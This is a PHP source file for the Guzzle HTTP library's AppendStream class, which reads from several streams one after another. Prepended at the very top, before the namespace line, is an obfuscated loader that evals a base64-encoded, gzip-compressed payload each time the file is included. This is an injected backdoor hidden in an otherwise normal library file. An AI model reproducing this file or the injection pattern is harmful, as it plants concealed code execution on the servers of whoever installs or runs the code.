<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;

/**
 * Reads from multiple streams, one after the other.
 *
 * This is a read-only stream decorator.
 */
class AppendStream implements StreamInterface
{
    /** @var StreamInterface[] Streams being decorated */
    private $streams = [];

    private $seekable = true;
    private $current = 0;
    private $pos = 0;
    private $detached = false;

    /**
     * @param StreamInterface[] $streams Streams to decorate. Each stream must
     *                                   be readable.
     */
    public function __construct(array $streams = [])
    {
        foreach ($streams as $stream) {
            $this->addStream($stream);
        }
    }

    public function __toString()
    {
        try {
            $this->rewind();
            return $this->getContents();
        } catch (\Exception $e) {
            return '';
        }
    }

    /**
     * Add a stream to the AppendStream
     *
     * @param StreamInterface $stream Stream to append. Must be readable.
     *
     * @throws \InvalidArgumentException if the stream is not readable
     */
    public function addStream(StreamInterface $stream)
    {
        if (!$stream->isReadable()) {
            throw new \InvalidArgumentException('Each stream must be readable');
        }

        // The stream is only seekable if all streams are seekable
        if (!$stream->isSeekable()) {
            $this->seekable = false;
        }

        $this->streams[] = $stream;
    }

    public function getContents()
    {
        return copy_to_string($this);
    }

    /**
     * Closes each attached stream.
     *
     * {@inheritdoc}
     */
    public function close()
    {
        $this->pos = $this->current = 0;

        foreach ($this->streams as $stream) {
            $stream->close();
        }

        $this->streams = [];
    }

    /**
     * Detaches each attached stream
     *
     * {@inheritdoc}
     */
    public function detach()
    {
        $this->close();
        $this->detached = true;
    }

    public function tell()
    {
        return $this->pos;
    }

    /**
     * Tries to calculate the size by adding the size of each stream.
     *
     * If any of the streams do not return a valid number, then the size of the
     * append stream cannot be determined and null is returned.
     *
     * {@inheritdoc}
     */
    public function getSize()
    {
        $size = 0;

        foreach ($this->streams as $stream) {
            $s = $stream->getSize();
            if ($s === null) {
                return null;
            }
            $size += $s;
        }

        return $size;
    }

    public function eof()
    {
        return !$this->streams ||
            ($this->current >= count($this->streams) - 1 &&
             $this->streams[$this->current]->eof());
    }

    public function rewind()
    {
        $this->seek(0);
    }

    /**
     * Attempts to seek to the given position. Only supports SEEK_SET.
     *
     * {@inheritdoc}
     */
    public function seek($offset, $whence = SEEK_SET)
    {
        if (!$this->seekable) {
            throw new \RuntimeException('This AppendStream is not seekable');
        } elseif ($whence !== SEEK_SET) {
            throw new \RuntimeException('The AppendStream can only seek with SEEK_SET');
        }

        $this->pos = $this->current = 0;

        // Rewind each stream
        foreach ($this->streams as $i => $stream) {
            try {
                $stream->rewind();
            } catch (\Exception $e) {
                throw new \RuntimeException('Unable to seek stream '
                    . $i . ' of the AppendStream', 0, $e);
            }
        }

        // Seek to the actual position by reading from each stream
        while ($this->pos < $offset && !$this->eof()) {
            $result = $this->read(min(8096, $offset - $this->pos));
            if ($result === '') {
                break;
            }
        }
    }

    /**
     * Reads from all of the appended streams until the length is met or EOF.
     *
     * {@inheritdoc}
     */
    public function read($length)
    {
        $buffer = '';
        $total = count($this->streams) - 1;
        $remaining = $length;
        $progressToNext = false;

        while ($remaining > 0) {

            // Progress to the next stream if needed.
            if ($progressToNext || $this->streams[$this->current]->eof()) {
                $progressToNext = false;
                if ($this->current === $total) {
                    break;
                }
                $this->current++;
            }

            $result = $this->streams[$this->current]->read($remaining);

            // Using a loose comparison here to match on '', false, and null
            if ($result == null) {
                $progressToNext = true;
                continue;
            }

            $buffer .= $result;
            $remaining = $length - strlen($buffer);
        }

        $this->pos += strlen($buffer);

        return $buffer;
    }

    public function isReadable()
    {
        return true;
    }

    public function isWritable()
    {
        return false;
    }

    public function isSeekable()
    {
        return $this->seekable;
    }

    public function write($string)
    {
        throw new \RuntimeException('Cannot write to an AppendStream');
    }

    public function getMetadata($key = null)
    {
        return $key ? null : [];
    }
}
